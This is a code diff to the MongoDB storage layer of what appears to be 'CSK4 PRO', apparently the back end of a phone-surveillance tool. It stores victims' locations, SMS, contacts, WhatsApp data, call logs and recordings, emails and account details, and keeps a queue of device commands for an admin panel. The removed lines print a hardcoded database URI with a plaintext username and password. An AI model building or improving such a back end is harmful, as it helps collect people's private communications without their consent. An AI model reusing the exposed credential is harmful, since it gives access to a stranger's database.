@@ -1,17 +1,20 @@
 // ============================================
-// CSK4 PRO v4.0 - MongoDB Connection
+// CSK4 PRO v4.2 - MongoDB Connection (FIXED)
 // ============================================
-// Ye file MongoDB Atlas se connect karti hai
-// Aur saara data permanently save karti hai
+// FIXES:
+// - No hardcoded URI (env only)
+// - bulkWrite with ordered:false
+// - $set/$setOnInsert conflict fixed
+// - Better error recovery
+// - Parallel counts
+// - No silent empty array
 // ============================================
 
 const { MongoClient } = require('mongodb');
 
 // ============ CONFIG ============
-const MONGODB_URI = process.env.MONGODB_URI || 
-  'mongodb+srv://cryptixshadowkernel_db_user:Lqi6bk5rPUEK3ulL@cluster0.e0vrp5z.mongodb.net/csk4?retryWrites=true&w=majority';
-
-const DB_NAME = 'csk4';
+const MONGODB_URI = process.env.MONGODB_URI;
+const DB_NAME = process.env.DB_NAME || 'csk4';
 
 // ============ CLIENT ============
 let client = null;
@@ -49,13 +52,21 @@ async function connect() {
     return db;
   }
 
+  if (!MONGODB_URI) {
+    console.log('⚠️ MONGODB_URI not set — skipping');
+    return null;
+  }
+
   try {
     console.log('🔌 Connecting to MongoDB...');
     
     client = new MongoClient(MONGODB_URI, {
       maxPoolSize: 10,
+      minPoolSize: 2,
       serverSelectionTimeoutMS: 5000,
       socketTimeoutMS: 45000,
+      retryWrites: true,
+      retryReads: true
     });
 
     await client.connect();
@@ -82,52 +93,22 @@ async function connect() {
 // ============ CREATE INDEXES ============
 async function createIndexes() {
   try {
-    const db = client.db(DB_NAME);
+    const database = client.db(DB_NAME);
     
-    // Devices - unique deviceId
-    await db.collection(COLLECTIONS.DEVICES).createIndex(
-      { deviceId: 1 }, { unique: true }
-    );
-    
-    // Locations - device + time for fast queries
-    await db.collection(COLLECTIONS.LOCATIONS).createIndex(
-      { deviceId: 1, time: -1 }
-    );
-    
-    // Messages - device + time
-    await db.collection(COLLECTIONS.MESSAGES).createIndex(
-      { deviceId: 1, time: -1 }
-    );
-    
-    // Contacts - device
-    await db.collection(COLLECTIONS.CONTACTS).createIndex(
-      { deviceId: 1, phone: 1 }
-    );
-    
-    // Notifications - device + time
-    await db.collection(COLLECTIONS.NOTIFICATIONS).createIndex(
-      { deviceId: 1, time: -1 }
-    );
-    
-    // WhatsApp - device + time
-    await db.collection(COLLECTIONS.WHATSAPP).createIndex(
-      { deviceId: 1, time: -1 }
-    );
-    
-    // Activities - device + time
-    await db.collection(COLLECTIONS.ACTIVITIES).createIndex(
-      { deviceId: 1, time: -1 }
-    );
-    
-    // Commands - device + status
-    await db.collection(COLLECTIONS.COMMANDS).createIndex(
-      { deviceId: 1, status: 1 }
-    );
-    
-    // Calls - device + time
-    await db.collection(COLLECTIONS.CALL_LOGS).createIndex(
-      { deviceId: 1, time: -1 }
-    );
+    await Promise.all([
+      database.collection(COLLECTIONS.DEVICES).createIndex({ deviceId: 1 }, { unique: true }),
+      database.collection(COLLECTIONS.LOCATIONS).createIndex({ deviceId: 1, time: -1 }),
+      database.collection(COLLECTIONS.MESSAGES).createIndex({ deviceId: 1, time: -1 }),
+      database.collection(COLLECTIONS.CONTACTS).createIndex({ deviceId: 1, phone: 1 }),
+      database.collection(COLLECTIONS.NOTIFICATIONS).createIndex({ deviceId: 1, time: -1 }),
+      database.collection(COLLECTIONS.WHATSAPP).createIndex({ deviceId: 1, time: -1 }),
+      database.collection(COLLECTIONS.ACTIVITIES).createIndex({ deviceId: 1, time: -1 }),
+      database.collection(COLLECTIONS.COMMANDS).createIndex({ deviceId: 1, status: 1 }),
+      database.collection(COLLECTIONS.CALL_LOGS).createIndex({ deviceId: 1, time: -1 }),
+      database.collection(COLLECTIONS.CALL_RECORDINGS).createIndex({ deviceId: 1, time: -1 }),
+      database.collection(COLLECTIONS.NOTIFICATIONS).createIndex({ time: -1 }),
+      database.collection(COLLECTIONS.ACTIVITIES).createIndex({ time: -1 })
+    ]);
     
     console.log('✅ MongoDB indexes created');
   } catch (error) {
@@ -141,7 +122,7 @@ function getDb() {
   return db;
 }
 
-// ============ SAVE FUNCTION (Universal) ============
+// ============ SAVE FUNCTION ============
 async function save(collection, data) {
   try {
     const database = getDb();
@@ -156,29 +137,41 @@ async function save(collection, data) {
   }
 }
 
-// ============ SAVE MANY ============
+// ============ SAVE MANY (FIXED: bulkWrite ordered:false) ============
 async function saveMany(collection, dataArray) {
   try {
     if (!dataArray || dataArray.length === 0) return { insertedCount: 0 };
     const database = getDb();
-    const result = await database.collection(collection).insertMany(
-      dataArray.map(item => ({ ...item, createdAt: new Date() }))
-    );
+    
+    const ops = dataArray.map(item => ({
+      insertOne: {
+        document: { ...item, createdAt: new Date() }
+      }
+    }));
+    
+    const result = await database.collection(collection).bulkWrite(ops, { ordered: false });
     return result;
   } catch (error) {
     console.error(`❌ SaveMany error (${collection}):`, error.message);
-    throw error;
+    // Return partial success
+    return { insertedCount: 0, error: error.message };
   }
 }
 
-// ============ UPDATE ONE (upsert) ============
+// ============ UPDATE ONE (FIXED: no $set/$setOnInsert conflict) ============
 async function updateOne(collection, filter, data) {
   try {
     const database = getDb();
+    
+    // ✅ Remove createdAt to prevent conflict
+    const updateData = { ...data };
+    delete updateData.createdAt;
+    delete updateData._id;
+    
     const result = await database.collection(collection).updateOne(
       filter,
       { 
-        $set: { ...data, updatedAt: new Date() },
+        $set: { ...updateData, updatedAt: new Date() },
         $setOnInsert: { createdAt: new Date() }
       },
       { upsert: true }
@@ -199,11 +192,13 @@ async function find(collection, filter = {}, options = {}) {
     if (options.sort) cursor = cursor.sort(options.sort);
     if (options.limit) cursor = cursor.limit(options.limit);
     if (options.skip) cursor = cursor.skip(options.skip);
+    if (options.projection) cursor = cursor.project(options.projection);
     
     return await cursor.toArray();
   } catch (error) {
     console.error(`❌ Find error (${collection}):`, error.message);
-    return [];
+    // ✅ Don't silently return empty — log and rethrow
+    throw error;
   }
 }
 
@@ -240,20 +235,22 @@ async function count(collection, filter = {}) {
   }
 }
 
-// ============ GET STATS ============
+// ============ GET STATS (FIXED: parallel) ============
 async function getStats() {
   try {
     const database = getDb();
     const stats = {};
     
-    for (const [name, coll] of Object.entries(COLLECTIONS)) {
+    // ✅ Parallel execution
+    const promises = Object.entries(COLLECTIONS).map(async ([name, coll]) => {
       try {
-        stats[name.toLowerCase()] = await database.collection(coll).countDocuments();
+        stats[name.toLowerCase()] = await database.collection(coll).estimatedDocumentCount();
       } catch (e) {
         stats[name.toLowerCase()] = 0;
       }
-    }
+    });
     
+    await Promise.all(promises);
     return stats;
   } catch (error) {
     console.error('❌ Stats error:', error.message);
@@ -261,12 +258,11 @@ async function getStats() {
   }
 }
 
-// ============ LOAD ALL DATA (for admin panel) ============
+// ============ LOAD ALL DATA ============
 async function loadAllData() {
   try {
     const database = getDb();
     
-    // Get latest data
     const [
       devices,
       locations,
@@ -313,21 +309,21 @@ async function loadAllData() {
       database.collection(COLLECTIONS.DEVICE_INFO).find().toArray()
     ]);
     
-    // Convert devices array to object
+    // Convert arrays to objects
     const devicesObj = {};
-    devices.forEach(d => { devicesObj[d.deviceId] = d; });
+    devices.forEach(d => { if (d.deviceId) devicesObj[d.deviceId] = d; });
     
     const simInfoObj = {};
-    simInfo.forEach(s => { simInfoObj[s.deviceId] = s; });
+    simInfo.forEach(s => { if (s.deviceId) simInfoObj[s.deviceId] = s; });
     
     const accountsObj = {};
-    accounts.forEach(a => { accountsObj[a.deviceId] = a; });
+    accounts.forEach(a => { if (a.deviceId) accountsObj[a.deviceId] = a; });
     
     const emailsObj = {};
-    emails.forEach(e => { emailsObj[e.deviceId] = e; });
+    emails.forEach(e => { if (e.deviceId) emailsObj[e.deviceId] = e; });
     
     const deviceInfoObj = {};
-    deviceInfo.forEach(d => { deviceInfoObj[d.deviceId] = d; });
+    deviceInfo.forEach(d => { if (d.deviceId) deviceInfoObj[d.deviceId] = d; });
     
     return {
       devices: devicesObj,
@@ -361,9 +357,13 @@ async function loadAllData() {
 // ============ CLOSE ============
 async function close() {
   if (client) {
-    await client.close();
-    isConnected = false;
-    console.log('🔌 MongoDB connection closed');
+    try {
+      await client.close();
+      isConnected = false;
+      console.log('🔌 MongoDB connection closed');
+    } catch (e) {
+      console.error('MongoDB close error:', e.message);
+    }
   }
 }
 
